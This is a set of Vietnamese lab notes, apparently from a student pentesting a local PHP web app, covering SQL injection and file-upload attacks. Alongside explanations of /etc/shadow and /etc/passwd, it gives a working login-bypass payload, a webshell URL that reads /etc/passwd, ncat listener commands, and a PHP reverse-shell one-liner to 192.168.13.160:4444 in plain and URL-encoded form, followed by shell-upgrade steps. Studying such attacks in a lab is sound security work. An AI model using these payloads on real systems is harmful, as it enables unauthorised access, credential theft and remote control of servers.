1. Làm sao biết lỗi SQL nào để sử dụng Payload?
Để biết một ứng dụng có bị lỗi SQL Injection hay không và xác định loại lỗi, các nhà nghiên cứu bảo mật thường sử dụng các kỹ thuật kiểm thử sau:

Kiểm thử Dấu nháy đơn (') (Single Quote Test):

Bạn nhập một dấu nháy đơn ' vào trường dữ liệu (ví dụ: username, ID tìm kiếm).

Nếu trang web báo lỗi SQL (ví dụ: SQL syntax error, unexpected '...): Đây là dấu hiệu mạnh mẽ cho thấy dữ liệu người dùng được nối trực tiếp vào câu lệnh SQL mà không được xử lý an toàn.

Kiểm thử Logic Boolean:

Sử dụng các biểu thức logic như AND 1=1 và AND 1=2.

Nếu nhập ' AND 1=1 -- và trang vẫn hoạt động bình thường, nhưng nhập ' AND 1=2 -- và trang trả về kết quả rỗng (khác nhau), thì ứng dụng đó có khả năng bị SQL Injection. Đây là cách hoạt động của SQL Injection dựa trên Boolean (Boolean-based SQLi).

- Lỗi nằm ở việc nối chuỗi (`. $username .`) trực tiếp vào câu lệnh SQL.
- Nếu một kẻ tấn công nhập `' OR '1'='1' --` vào ô username, câu lệnh SQL sẽ trở thành:
`SELECT * FROM users WHERE username = '' OR '1'='1' -- ' LIMIT 1`
- Đối với CSDL, `OR '1'='1'` luôn đúng, và `-` là comment, nó bỏ qua phần còn lại của câu lệnh.
- Kết quả: Câu lệnh này sẽ luôn trả về người dùng *đầu tiên* trong bảng (thường là `admin`), bất kể `username` là gì.
- 

Để payload (chuỗi tấn công) logic là `' OR '1'='1' --` hoạt động, biến `$username` mà người dùng nhập vào phải được chế tạo để "khớp" hoàn hảo với các dấu nháy trong code PHP của bạn.

Biến `$username` cần phải chứa:
`' OR '1'='1' --` *(Lưu ý: có một dấu nháy ở đầu và một khoảng trắng ở cuối)*

 
Do có `LIMIT 1`, câu lệnh sẽ trả về người dùng đầu tiên trong cơ sở dữ liệu, cho phép kẻ tấn công đăng nhập vào tài khoản đó mà không cần biết mật khẩu.

Vì code ghép trực tiếp giá trị do user nhập vào chuỗi SQL mà không dùng parameterized queries. Nếu attacker đặt giá trị chứa dấu nháy và biểu thức logic, SQL sẽ bị sửa — ví dụ username = `' OR '1'='1` → câu SQL trở thành:

SELECT * FROM users WHERE username = '' OR '1'='1' LIMIT 1=> trả về bản ghi đầu tiên (có thể là admin) → bypass đăng nhập.

2. Tệp /etc/shadow là gì?
Tệp /etc/shadow là một thành phần quan trọng của hệ thống bảo mật người dùng trên các hệ điều hành Linux/Unix.

Chức năng: Tệp này lưu trữ mật khẩu đã được băm (hashed passwords) và thông tin về thời gian hết hạn của mật khẩu cho tất cả người dùng hệ thống.

Bảo mật: Tệp này chỉ có thể được đọc bởi người dùng root (người quản trị) để bảo vệ các hash mật khẩu khỏi sự truy cập của người dùng thông thường hoặc kẻ tấn công.

Phân biệt với /etc/passwd:

/etc/passwd chứa thông tin cơ bản của người dùng (tên người dùng, ID, thư mục chính, shell mặc định) và thường có thể được đọc bởi tất cả mọi người. Trường mật khẩu trong /etc/passwd chỉ chứa ký tự x hoặc *, cho biết mật khẩu thực đã được lưu trong /etc/shadow.

3. RCE & Unrestricted File Upload:

Nguy cơ RCE: Xảy ra khi một ứng dụng cho phép người dùng tải lên các tệp có đuôi mở rộng mà máy chủ web có thể thực thi (như .php, .jsp). Kẻ tấn công tải lên một tệp chứa mã độc (webshell) và sau đó truy cập nó để chạy bất kỳ lệnh nào trên máy chủ.

Unrestricted File Upload (RCE risk)
Vị trí: /upload (student/teacher) và /admin/upload_material (admin); ALLOWED_EXT = None (không hạn chế).
Cách tấn công:
Upload file với phần mở rộng .php hoặc .jsp nếu server web thực thi file trong folder uploads, sau đó truy cập file tải lên để thực thi mã.
Hoặc upload webshell, rồi dùng để leo thang tấn công.

- Mật khẩu của các user “hệ điều hành” (Linux) nằm ở /etc/shadow (hash, chỉ root đọc); /etc/passwd chỉ chứa một chữ 'x' ở cột password.
- Mật khẩu của user trong ứng dụng FAP (webapp) nằm trong file SQLite của dự án: `data/fap.db`, bảng `users`, cột `password`. Trong mã nguồn `src/db.php` (hàm seed/ensureSchema) bạn đang lưu mật khẩu ở dạng plaintext (ví dụ 'admin123', 'sv123'...), tức là không băm — đây là rủi ro bảo mật lớn.

**Tệp `/etc/shadow` là gì?**

- Đây là một trong những tệp tin nhạy cảm nhất trên hệ thống Linux.
- Nó lưu trữ **mật khẩu đã được băm (hashed passwords)** của tất cả người dùng.
- Đây là tệp mà kẻ tấn công muốn đọc để lấy các hash này và bẻ khóa chúng (brute-force) offline để tìm ra mật khẩu.

Lệnh kiếm passwd

[127.0.0.1:8000/uploads/Untitled-1.php?cmd=cat /etc/passwd](http://127.0.0.1:8000/uploads/Untitled-1.php?cmd=cat%20/etc/passwd)

Lệnh mở ncat

cd "C:\Program Files (x86)\Nmap”

.\ncat.exe -lvnp 4444

Lệnh ncat

nc -lvnp 4444

payload **Reverse Shell**

php -r '$sock=fsockopen("192.168.13.160",4444);exec("/bin/sh -i <&3 >&3 2>&3");’

payload đã mã hóa để đưa lên URL

[localhost:8000/uploads/Untitled-1.php?cmd=php -r %27%24sock%3Dfsockopen%28"192.168.13.160"%2C4444%29%3Bexec%28"%2Fbin%2Fsh -i <%263 >%263 2>%263"%29%3B%27](http://localhost:8000/uploads/Untitled-1.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.13.160%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27)

Nâng cấp lên Shell Tương tác (TTY)

script /dev/null -c /bin/bash

**Cấu hình Terminal Kali:**
Gõ chính xác lệnh này vào terminal Kali của bạn và nhấn Enter:

stty raw -echo

- **Chạy nền Shell:**
Nhấn tổ hợp phím: **`Ctrl + Z`**
(Lệnh này sẽ tạm dừng reverse shell và trả bạn về terminal Kali `(kali@kali)-[~]`).
- **Cấu hình Terminal Kali:**
Gõ chính xác lệnh này vào terminal Kali của bạn và nhấn Enter:Bash
    
    `stty raw -echo`
    
    (Lệnh này báo cho terminal Kali biết nó sắp nhận dữ liệu "thô").
    
- **Quay lại Reverse Shell:**
Gõ `fg` và nhấn **Enter** (có thể cần nhấn 2 lần).
(Lệnh này `fg` - foreground - để đưa reverse shell của bạn quay trở lại).